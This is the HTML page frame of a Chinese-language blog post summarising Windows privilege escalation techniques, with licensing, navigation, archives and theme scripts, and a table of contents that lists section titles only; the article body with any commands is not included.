+</div><div class="article-licensing box"><div class="licensing-title"><p>简易提权知识点总结</p><p><a href="https://resek4.github.io/2021/02/19/提权/">https://resek4.github.io/2021/02/19/提权/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>Resek4</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2021-02-19</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2023-01-27</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="addthis_inline_share_toolbox"></div><script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-604b3726d8c18ac5" defer></script></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/03/12/Windows%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E6%BA%AF%E6%BA%90/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">Windows 系统事件类型</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/01/11/XXE/"><span class="level-item">XML External Entity injection(XXE) Summary</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><script src="https://utteranc.es/client.js" repo="Resek4/resek4.github.io" issue-term="pathname" theme="dark-blue" crossorigin="anonymous" async></script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.jpg" alt="Resek4"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Resek4</p><p class="is-size-6 is-block">对黑客创意上下求索</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>NightCity</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">29</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">4</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/Resek4" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/Resek4"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com/Resek_4"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="https://resek4.github.io"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2023/01/"><span class="level-start"><span class="level-item">January 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/12/"><span class="level-start"><span class="level-item">December 2022</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/10/"><span class="level-start"><span class="level-item">October 2022</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/08/"><span class="level-start"><span class="level-item">August 2022</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/06/"><span class="level-start"><span class="level-item">June 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">February 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/07/"><span class="level-start"><span class="level-item">July 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/06/"><span class="level-start"><span class="level-item">June 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">May 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">March 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">February 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">January 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/11/"><span class="level-start"><span class="level-item">November 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/09/"><span class="level-start"><span class="level-item">September 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/08/"><span class="level-start"><span class="level-item">August 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/07/"><span class="level-start"><span class="level-item">July 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/05/"><span class="level-start"><span class="level-item">May 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/01/"><span class="level-start"><span class="level-item">January 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/12/"><span class="level-start"><span class="level-item">December 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/11/"><span class="level-start"><span class="level-item">November 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><!--!--><div class="column-right-shadow is-hidden-widescreen is-sticky"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#系统内核溢出漏洞"><span class="level-left"><span class="level-item">1</span><span class="level-item">系统内核溢出漏洞</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#手动执行发现缺失补丁"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">手动执行发现缺失补丁</span></span></a></li><li><a class="level is-mobile" href="#通过联网查询得知并且利用"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">通过联网查询得知并且利用</span></span></a></li></ul></li><li><a class="level is-mobile" href="#Windows-系统配置错误"><span class="level-left"><span class="level-item">2</span><span class="level-item">Windows 系统配置错误</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#直接获取系统安装的配置文件"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">直接获取系统安装的配置文件</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#概述"><span class="level-left"><span class="level-item">2.1.1</span><span class="level-item">概述</span></span></a></li><li><a class="level is-mobile" href="#多种利用方式"><span class="level-left"><span class="level-item">2.1.2</span><span class="level-item">多种利用方式</span></span></a></li></ul></li><li><a class="level is-mobile" href="#系统服务权限配置错误"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">系统服务权限配置错误</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#概述-1"><span class="level-left"><span class="level-item">2.2.1</span><span class="level-item">概述</span></span></a></li><li><a class="level is-mobile" href="#多种利用方式-1"><span class="level-left"><span class="level-item">2.2.2</span><span class="level-item">多种利用方式</span></span></a></li></ul></li><li><a class="level is-mobile" href="#注册表键-AlwaysInstallElevated"><span class="level-left"><span class="level-item">2.3</span><span class="level-item">注册表键 AlwaysInstallElevated</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#概述-2"><span class="level-left"><span class="level-item">2.3.1</span><span class="level-item">概述</span></span></a></li><li><a class="level is-mobile" href="#多种利用方式-2"><span class="level-left"><span class="level-item">2.3.2</span><span class="level-item">多种利用方式</span></span></a></li></ul></li><li><a class="level is-mobile" href="#可信任服务路径漏洞"><span class="level-left"><span class="level-item">2.4</span><span class="level-item">可信任服务路径漏洞</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#概述-3"><span class="level-left"><span class="level-item">2.4.1</span><span class="level-item">概述</span></span></a></li><li><a class="level is-mobile" href="#利用方式一："><span class="level-left"><span class="level-item">2.4.2</span><span class="level-item">利用方式一：</span></span></a></li><li><a class="level is-mobile" href="#利用方式二："><span class="level-left"><span class="level-item">2.4.3</span><span class="level-item">利用方式二：</span></span></a></li></ul></li><li><a class="level is-mobile" href="#计划任务"><span class="level-left"><span class="level-item">2.5</span><span class="level-item">计划任务</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#利用方式"><span class="level-left"><span class="level-item">2.5.1</span><span class="level-item">利用方式</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#组策略首选项问题"><span class="level-left"><span class="level-item">3</span><span class="level-item">组策略首选项问题</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#创建一个组策略并批量修改本地管理员密码"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">创建一个组策略并批量修改本地管理员密码</span></span></a></li><li><a class="level is-mobile" href="#获取组策略凭据"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">获取组策略凭据</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#概述-4"><span class="level-left"><span class="level-item">3.2.1</span><span class="level-item">概述</span></span></a></li><li><a class="level is-mobile" href="#多种利用方式-3"><span class="level-left"><span class="level-item">3.2.2</span><span class="level-item">多种利用方式</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#绕过-UAC-提权"><span class="level-left"><span class="level-item">4</span><span class="level-item">绕过 UAC 提权</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#概述-5"><span class="level-left"><span class="level-item">4.1</span><span class="level-item">概述</span></span></a></li><li><a class="level is-mobile" href="#利用方式-1"><span class="level-left"><span class="level-item">4.2</span><span class="level-item">利用方式</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#bypassuac-模块"><span class="level-left"><span class="level-item">4.2.1</span><span class="level-item">bypassuac 模块</span></span></a></li><li><a class="level is-mobile" href="#Runas-模块"><span class="level-left"><span class="level-item">4.2.2</span><span class="level-item">Runas 模块</span></span></a></li><li><a class="level is-mobile" href="#Nishang-的-Invoke-PsUACme-模块"><span class="level-left"><span class="level-item">4.2.3</span><span class="level-item">Nishang 的 Invoke-PsUACme 模块</span></span></a></li><li><a class="level is-mobile" href="#Empire-中的-bypassuac-模块"><span class="level-left"><span class="level-item">4.2.4</span><span class="level-item">Empire 中的 bypassuac 模块</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#令牌窃取"><span class="level-left"><span class="level-item">5</span><span class="level-item">令牌窃取</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#概述-6"><span class="level-left"><span class="level-item">5.1</span><span class="level-item">概述</span></span></a></li><li><a class="level is-mobile" href="#利用方式-2"><span class="level-left"><span class="level-item">5.2</span><span class="level-item">利用方式</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#令牌窃取-1"><span class="level-left"><span class="level-item">5.2.1</span><span class="level-item">令牌窃取</span></span></a></li><li><a class="level is-mobile" href="#Rotten-Potato-提权"><span class="level-left"><span class="level-item">5.2.2</span><span class="level-item">Rotten Potato 提权</span></span></a></li><li><a class="level is-mobile" href="#Empire-下的-mimikatz"><span class="level-left"><span class="level-item">5.2.3</span><span class="level-item">Empire 下的 mimikatz</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#无凭证条件下的权限获取"><span class="level-left"><span class="level-item">6</span><span class="level-item">无凭证条件下的权限获取</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#概述-7"><span class="level-left"><span class="level-item">6.1</span><span class="level-item">概述</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#LLMNR"><span class="level-left"><span class="level-item">6.1.1</span><span class="level-item">[[LLMNR]]</span></span></a></li><li><a class="level is-mobile" href="#NetBIOS"><span class="level-left"><span class="level-item">6.1.2</span><span class="level-item">NetBIOS</span></span></a></li><li><a class="level is-mobile" href="#Net-NTLM-Hash"><span class="level-left"><span class="level-item">6.1.3</span><span class="level-item">Net-NTLM Hash</span></span></a></li></ul></li><li><a class="level is-mobile" href="#利用方式-3"><span class="level-left"><span class="level-item">6.2</span><span class="level-item">利用方式</span></span></a></li></ul></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/HackStyle/"><span class="level-start"><span class="level-item">HackStyle</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/categories/Penetration/"><span class="level-start"><span class="level-item">Penetration</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile" href="/categories/TechLearning/"><span class="level-start"><span class="level-item">TechLearning</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/categories/Toolkit/"><span class="level-start"><span class="level-item">Toolkit</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-01-09T16:00:00.000Z">2023-01-10</time></p><p class="title"><a href="/2023/01/10/Git/">Simple git use summary</a></p><p class="categories"><a href="/categories/TechLearning/">TechLearning</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-12-30T16:00:00.000Z">2022-12-31</time></p><p class="title"><a href="/2022/12/31/fzf/">fzf(Fuzzy File Finder) Usage Summary</a></p><p class="categories"><a href="/categories/Toolkit/">Toolkit</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-12-08T16:00:00.000Z">2022-12-09</time></p><p class="title"><a href="/2022/12/09/%E6%A0%91%E8%8E%93%E6%B4%BE%E6%90%AD%E5%BB%BA%E5%AE%B6%E5%BA%AD%E5%BD%B1%E9%99%A2/">使用树莓派搭建 Kodi 家庭影院</a></p><p class="categories"><a href="/categories/HackStyle/">HackStyle</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-12-06T16:00:00.000Z">2022-12-07</time></p><p class="title"><a href="/2022/12/07/%E6%A0%91%E8%8E%93%E6%B4%BE%E8%87%AA%E5%BB%BA%E5%9B%BE%E5%BA%8A/">使用 Raspberry Pi 自建 MinIO 图床</a></p><p class="categories"><a href="/categories/HackStyle/">HackStyle</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-25T17:52:00.000Z">2022-10-26</time></p><p class="title"><a href="/2022/10/26/Arch%20Linux%20%E5%AE%89%E8%A3%85%E6%B5%81%E7%A8%8B/">Arch Linux 全流程安装纪实</a></p><p class="categories"><a href="/categories/Toolkit/">Toolkit</a></p></div></article></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.jpg" alt="Resek&#039;s Kingdom" height="28"></a><p class="is-size-7"><span>&copy; 2023 Resek4</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/Resek4"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "This website uses cookies to improve your experience.",
+          dismiss: "Got it!",
+          allow: "Allow cookies",
+          deny: "Decline",
+          link: "Learn more",
+          policy: "Cookie Policy",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
+        });</script></body></html>
